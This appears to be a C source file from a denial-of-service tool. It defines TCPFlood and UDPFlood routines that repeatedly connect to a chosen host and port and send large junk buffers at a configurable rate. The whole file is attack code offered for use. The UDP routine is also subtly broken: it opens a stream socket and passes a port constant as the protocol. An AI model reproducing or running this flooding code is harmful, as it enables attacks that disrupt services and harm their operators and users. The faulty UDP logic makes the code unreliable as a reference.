#include "Flood.h"
#include "Sockets.h"
#include <stdio.h>

void TCPFlood(char* destination, unsigned short port, int seconds, int timespersecond) {
#ifdef _DEBUG_
	printf("[+] TCPFlood(%s, %d, %d, %d).\n", destination, port, seconds, timespersecond);
#endif
#ifdef __WIN32
	sockaddr_in input;
	if (!GetSocketAddress(destination, &input)) return;
	input.sin_port = htons(port);
	SOCKET s;

	char data[65536];
	memset(data, 0xCC, 65536);

	for (int i = 0; i < seconds * timespersecond; i++) {
		Sleep(1000 / timespersecond);
		s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (s == 0) continue;

		int cRes = connect(s, (sockaddr*)&input, sizeof(input));
		if (cRes == SOCKET_ERROR) {
			closesocket(s); continue;
		}
		send(s, data, 65536, 0);
		Sleep(10);
		send(s, data, 65536, 0);

		closesocket(s);
	}
#endif
}

void UDPFlood(char* destination, unsigned short port, int seconds, int timespersecond) {
#ifdef _DEBUG_
	printf("[+] UDPFlood(%s, %d, %d, %d).\n", destination, port, seconds, timespersecond);
#endif
#ifdef __WIN32
	sockaddr_in input;
	if (!GetSocketAddress(destination, &input)) return;
	input.sin_port = htons(port);
	SOCKET c;

	char dat[65536];
	memset(dat, 0xCC, 65536);

	for (int i = 0; i < seconds * timespersecond; i++) {
		Sleep(1000 / timespersecond);
		c = socket(AF_INET, SOCK_STREAM, IPPORT_BIFFUDP);
		if (c == 0) continue;
		int cRes = connect(c, (sockaddr*)&input, sizeof(input));
		if (cRes == SOCKET_ERROR) {
			closesocket(c); continue;
		}
		send(c, dat, 65536, 0);
		Sleep(10);
		send(c, dat, 65536, 0);

		closesocket(c);
	}
#endif
}
